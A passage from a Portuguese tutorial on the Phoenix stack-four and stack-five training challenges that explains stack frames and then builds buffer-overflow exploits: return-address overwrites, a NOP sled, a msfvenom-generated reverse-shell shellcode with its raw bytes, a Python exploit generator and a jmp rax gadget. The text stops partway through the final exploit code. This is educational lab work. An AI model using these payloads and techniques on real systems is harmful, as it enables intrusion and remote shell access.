<p>Para a explica√ß√£o, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly √© legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> s√£o definidas e nos j√° sabemos como isso funciona, agora vamos chamar a fun√ß√£o, que √© aonde a m√°gica acontece !</p>
<h4 id="-pr√≥logo"><a class="header" href="#-pr√≥logo">üîí Pr√≥logo</a></h4>
<ul>
<li>Se a fun√ß√£o receber argumentos, passar eles
Chamar a fun√ß√£o </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a fun√ß√£o</li>
</ul>
<h5 id="se-a-fun√ß√£o-receber-argumentos-salvar-eles"><a class="header" href="#se-a-fun√ß√£o-receber-argumentos-salvar-eles">Se a fun√ß√£o receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos s√£o passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necess√°rio dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4 id="salvar-o-frame-atual"><a class="header" href="#salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, por√©m n√£o o valor atual,
	       ; e sim o endere√ßo da pr√≥xima instru√ß√£o 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4 id="criar-novo-frame"><a class="header" href="#criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp at√© o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; at√© o rsp
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localiza√ß√£o
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espa√ßo na mem√≥ria para essa fun√ß√£o </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a fun√ß√£o precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Vari√°veis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse m√©todo de chamar fun√ß√£o, n√£o importa a localiza√ß√£o da mem√≥ria de quando a fun√ß√£o foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma fun√ß√£o chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destru√≠do ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execu√ß√£o normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo ent√£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a fun√ß√£o
</code></pre>
<h4 id="-ep√≠logo"><a class="header" href="#-ep√≠logo">üîë Ep√≠logo</a></h4>
<p>O epilogo √© bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instru√ß√µes               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp at√© o rbp)</p>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...                    
Vari√°veis print dois   A regi√£o n√£o √© apagada, pois consumiria processamento a toa!
...         O valores ficam largados l√° at√© uma nova fun√ß√£o escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleat√≥rio
...         Eles pode ser ignorado pois nem est√° mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> 
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instru√ß√£o
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instru√ß√£o &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado gra√ßas ao rbp e rip salvos ( o rip salvo √© chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1 id="-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber"><a class="header" href="#-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber">üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</a></h1>
<p>Existem algumas vari√°veis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o que est√° sendo executada 
</code></pre>
<p>O RIP e o RBP atuais s√£o salvos na stack quando chamamos uma fun√ß√£o, junto das outras vari√°veis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na fun√ß√£o
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exerc√≠cios anteriores, tamb√©m conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execu√ß√£o do programa!</p>
<h1 id="-exploit-1"><a class="header" href="#-exploit-1">üî• Exploit</a></h1>
<h2 id="-analisar-o-programa"><a class="header" href="#-analisar-o-programa">üî¨ Analisar o programa</a></h2>
<p>O programa contem 3 fun√ß√µes: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do come√ßo do n√≠vel e chama start_level</p>
<p><code>complete_level</code> √© a fun√ß√£o que precisamos chamar</p>
<p><code>start_level</code> √© onde a magica acontece: <code>gets()</code> (vulner√°vel) √© chamada num <code>buffer[64]</code></p>
<h2 id="-o-compilador-adicionou-coisa"><a class="header" href="#-o-compilador-adicionou-coisa">‚ÅâÔ∏è O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A fun√ß√£o normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip n√£o mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Ent√£o precisamos levar isso em considera√ß√£o, n√£o basta s√≥ olhar que o tamanho do buffer √© 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplica√ß√µes mais complexas, essa diferen√ßa pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferen√ßa usando ferramentas como fuzzers ou geradores de padr√£o...</p>
<p>Como nosso exemplo √© simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apo≈õ <strong>88</strong> bytes, temos o SRP :D</p>
<h2 id="-encontrar-endere√ßo-de-complete_level"><a class="header" href="#-encontrar-endere√ßo-de-complete_level">üè† Encontrar endere√ßo de complete_level</a></h2>
<p>Voc√™ se lembra como faz? Nos usamos no exerc√≠cio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora √© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endere√ßo:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dif√≠cil! Se voc√™ chegou at√© aqui, parab√©ns! :D</p>
<h1 id="-solu√ß√£o-4"><a class="header" href="#-solu√ß√£o-4">üí´ Solu√ß√£o</a></h1>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackFive.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="stack/phoenix/StackFive.html#-dicas">üí° Dicas</a></li>
<li><a href="stack/phoenix/StackFive.html#-exploit">üî• Exploit</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#analisando-o-programa">Analisando o programa</a></li>
<li><a href="stack/phoenix/StackFive.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise est√°tica)</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#breakpoint">Breakpoint</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFive.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise din√¢mica)</a></li>
<li><a href="stack/phoenix/StackFive.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endere√ßo do buffer</a></li>
<li><a href="stack/phoenix/StackFive.html#nop-sled">NOP sled</a></li>
<li><a href="stack/phoenix/StackFive.html#shellcode">Shellcode</a></li>
<li><a href="stack/phoenix/StackFive.html#corrigindo-o-problema">Corrigindo o problema</a>
<ul>
<li><a href="stack/phoenix/StackFive.html#rop-gadgets">ROP Gadgets</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackFive.html#-solu%C3%A7%C3%A3o">üí´ Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo-4"><a class="header" href="#-objetivo-4">üéØ Objetivo</a></h1>
<p>Finalmente! Tudo isso para chegar no BOF SRP (cl√°ssico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso c√≥digo malicioso (shellcode) para ganhar uma shell </p>
<h1 id="-dicas-1"><a class="header" href="#-dicas-1">üí° Dicas</a></h1>
<p>A instru√ß√£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execu√ß√£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar c√≥digo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execu√ß√£o de c√≥digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<h1 id="-exploit-2"><a class="header" href="#-exploit-2">üî• Exploit</a></h1>
<h2 id="analisando-o-programa"><a class="header" href="#analisando-o-programa">Analisando o programa</a></h2>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como voc√™ pode ver, n√£o existe <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso pr√≥prio c√≥digo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<h2 id="agora-em-asm-d-analise-est√°tica"><a class="header" href="#agora-em-asm-d-analise-est√°tica">Agora em ASM :D (analise est√°tica)</a></h2>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endere√ßos para simplificar, e s√≥ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (c√≥digo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<h3 id="breakpoint"><a class="header" href="#breakpoint">Breakpoint</a></h3>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrus√£o ser executada, sera substitu√≠da por <code>0xCC</code>. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!</p>
<p>Quando continuamos executando (normalmente o comando √© <strong>continue</strong>), o <code>0xCC</code> √© substitu√≠do pela instru√ß√£o certa :D</p>
<p>Se voc√™ esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; √© o comando do gdb para adicionar um breakpoint \ 
A &quot;*&quot; tem haver com aquele dos pointers \ 
O endere√ßo √© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha) 
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D</p>
</blockquote>
<h2 id="agora-vamos-executar-o-programa-analise-din√¢mica"><a class="header" href="#agora-vamos-executar-o-programa-analise-din√¢mica">Agora vamos executar o programa (analise din√¢mica)</a></h2>
<p>126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no pr√≥ximo desafio: buffers s√£o terminados com um null byte!</p>
<p>Por enquanto, isso s√≥ nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)</p>
<h2 id="encontrar-endere√ßo-do-buffer"><a class="header" href="#encontrar-endere√ßo-do-buffer">Encontrar endere√ßo do buffer</a></h2>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
<p>r √© o comand do gdb para rodar o programa!
Adicionando &quot;&lt;&lt;&lt;&quot; n√≥s podemos mandar uma string pro input! Tamb√©m funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
</blockquote>
<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
</code></pre>
<blockquote>
<p>gef √© uma extens√£o do gdb que vai te dar um monte de informa√ß√£o util quando voc√™ chegar num breakpoint</p>
</blockquote>
<p>O output do gef contem:
<img src="stack/phoenix/./img/gef_example.png" alt="" />
Porem, mais informa√ß√µes podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) n√£o pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow √© poss√≠vel (olha as linhas no final da segunda imagem)
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_0.png" alt="" />
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
<img src="stack/phoenix/./img/stack_five/before_gets_0.png" alt="" /></p>
<p>As partes importante no output do gef s√£o:</p>
<p>registers
<img src="stack/phoenix/./img/stack_five/before_gets_3.png" alt="" /></p>
<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
<img src="stack/phoenix/./img/stack_five/before_gets_1.png" alt="" /></p>
<blockquote>
<p>Lembrete de que pointer come√ßa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
</blockquote>
<p>stack
<img src="stack/phoenix/./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Voc√™ tamb√©m acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Ent√£o vamos avan√ßar para pr√≥xima instru√ß√£o (step: <code>s</code>) :D
<img src="stack/phoenix/./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o shellcode :D</p>
<p>Mas agora precisamos saber com precis√£o quantos As at√© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha √© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Ent√£o para encontrar precisamente quantos As precisamos colocar at√© chegarmos no RIP,
basta subtrair <code>endere√ßo do rip salvo - endere√ßo dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="stack/phoenix/./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<h2 id="nop-sled"><a class="header" href="#nop-sled">NOP sled</a></h2>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar naquela localiza√ß√£o :(</p>
<p>Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="stack/phoenix/./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="stack/phoenix/./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro m√©todo de remedia√ß√£o √© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D</p>
<p>A representa√ß√£o em machine code do NOP √© <code>0x90</code> :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos v√°rios desses em sequencia, o RIP vai &quot;deslizando&quot; atrav√©s at√© chegar no nosso c√≥digo!</p>
<p>Voc√™ pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="stack/phoenix/./img/panda_slide_1.gif" alt="" /></p>
<p>Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar at√© o nosso c√≥digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Endere√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb ser√£o removidos</strong>, ent√£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na se√ß√£o <code>code</code> do gef
<img src="stack/phoenix/./img/stack_five/gef_run_xCC.png" alt="" />
Meio dif√≠cil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90 </p>
</blockquote>
<p>Apos a nossa ultima instru√ß√£o ha instru√ß√µes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<h2 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h2>
<p>Shellcode √© o c√≥digo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocar√≠amos no input, mas ao inv√©s de printarmos para o terminal, vamos salvar em um arquivo bin√°rio (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
<p>Depois √© s√≥ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: viola√ß√£o de segmento</code></p>
<h2 id="corrigindo-o-problema"><a class="header" href="#corrigindo-o-problema">Corrigindo o problema</a></h2>
<p>Nessa eu empaquei, e a solu√ß√£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Ent√£o valeu pela ajuda :D</p>
<p>Ao inv√©s de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio √© que, por estarmos pulando para uma parte est√°tica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!</p>
<p>Isso quer dizer que n√£o precisamos mais do NOP slide :D </p>
<h3 id="rop-gadgets"><a class="header" href="#rop-gadgets">ROP Gadgets</a></h3>
<p>Essa √© uma t√©cnica chamada programa√ß√£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses <code>jmps</code> √© chamado de <strong>gadget</strong></p>
<p>Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o inicio do nosso buffer
<img src="stack/phoenix/./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, n√£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>S√≥ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Ent√£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
